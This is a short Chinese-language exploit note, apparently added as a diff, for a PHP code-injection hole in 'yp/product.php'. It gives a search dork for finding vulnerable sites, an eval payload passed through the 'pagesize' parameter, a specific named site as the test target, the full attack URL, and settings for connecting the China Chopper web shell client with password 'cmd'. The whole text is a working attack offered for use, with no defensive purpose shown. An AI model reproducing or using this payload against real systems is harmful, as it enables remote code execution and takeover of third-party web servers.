@@ -1,0 +1,14 @@
+关键字：inurl:yp/product.php
+
+exp代码：pagesize=${${@eval_r($_POST[cmd])}}
+
+测试网站：http://www.slsdgc.com.cn/yp/product.php?catid=721
+
+利用方法：http://www.slsdgc.com.cn/yp/product.php?pagesize=${${@eval_r($_POST[cmd])}}
+
+菜刀连接：http://www.slsdgc.com.cn/yp/product.php?pagesize=${${@eval_r($_POST[cmd])}}  密码cmd
+
+菜刀连接注意以下格式：
+
+   默认级别                    php                       gb2312
+
